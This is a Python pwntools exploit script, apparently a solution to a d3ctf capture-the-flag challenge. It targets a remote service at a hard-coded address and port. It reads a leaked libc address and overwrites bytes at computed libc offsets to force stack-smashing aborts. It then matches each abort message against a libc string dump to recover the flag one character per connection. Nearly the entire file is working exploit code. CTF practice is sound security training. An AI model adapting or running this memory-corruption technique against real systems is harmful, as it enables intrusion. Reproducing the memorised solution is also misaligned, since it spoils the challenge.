#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import lianpwn
import sys

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

LOCAL = 0
filename = "./vuln"
if LOCAL:
    # io = process(filename)
    pass
else:
    remote_service = "47.103.122.127:31870"
    remote_service = remote_service.strip().split(":")
    # io = remote(remote_service[0], int(remote_service[1]))
elf = ELF(filename, checksec=False)
libc = ELF(elf.libc.path, checksec=False)

context.log_level = "info"

flag = "d3ctf{"
i = 0

while 1:
    io = remote(remote_service[0], int(remote_service[1]))
    libc_start = int(ru(b"-", "drop"), 16)
    libc_base = libc_start - 0x26000

    ru(b"flag")
    ru(b"}}\n")

    def set(addr, off):
        addr = addr - 0x7FFFF7C26000 + libc_start
        sl(i2b(addr))
        sl(i2b(off))

    set(0x7FFFF7D38F36 + 3, 6 + i)
    set(0x7FFFF7C5C577 + 5, 6)

    # Try to trigger stack smash
    set(0x7FFFF7C5C577 + 5, 6)

    ru(b"*** ")
    data_leak = ru(b" ***: terminated\n", "drop")
    print(data_leak)

    def cmp(data_leak):
        libcdump = open("./libc_strings.dump", "rb").read()
        res = libcdump.index(data_leak)
        print(chr(res + 0x30 - 7))
        return chr(res + 0x30 - 7)

    flag += cmp(data_leak)
    lianpwn.lg_inf(flag)

    i += 1
    io.close()
